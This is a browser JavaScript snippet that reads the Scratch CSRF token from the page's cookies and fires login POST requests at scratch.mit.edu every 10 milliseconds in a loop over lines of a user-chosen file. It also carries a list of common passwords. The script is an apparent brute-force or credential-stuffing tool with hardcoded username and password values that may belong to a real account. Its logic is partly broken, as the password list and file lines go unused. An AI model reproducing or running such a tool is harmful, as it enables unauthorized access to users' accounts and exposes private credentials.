let passwordlist=["123456","password","000000","1qaz2wsx","12345678","123456789","111111","sakura","dropbox","12345","1234567","1234567890","qwerty","zxcvbnm","asdfghjkl","qwertyuiop","adgjmptw","123123","121212"];
var input=document.createElement("input");
input.type="file";
input.style.display="none";
document.body.appendChild(input);
var reader = new FileReader();
input.addEventListener('change', () => {
    for(file of input.files){
        reader.readAsText(file, 'UTF-8');
        reader.onload = ()=> {
            const flw = async (index) => {
              let token="";
              {
                  let cookie=document.cookie;
                  cookie=cookie.split(';');
                  let cok=[[],[]];
                  cookie.forEach(function(element){
                      const elements=element.split("=");
                      cok[0].push(elements[0]);
                      cok[1].push(elements[1]);
                  });
                  token=cok[1][cok[0].indexOf(' scratchcsrftoken')];
              }
            let username="yamaguchi03";
            let password="yharu0301";
            fetch("https://scratch.mit.edu/accounts/login/",
            {method:"POST",
            body:JSON.stringify({"username":username,"password":password,"useMessages":false}),
            "headers":{"x-csrftoken":token,"x-requested-with": "XMLHttpRequest"}});
            }
            let prom=reader.result.split("\n");
            let setint=setInterval(follow,10);
            let i=prompt("何人目から始めますか?");
            function follow(){
                flw(i)
                i++;
                if(i>prom.length){
                    clearInterval(setint);
                }
            }
};
    }
});
input.click();
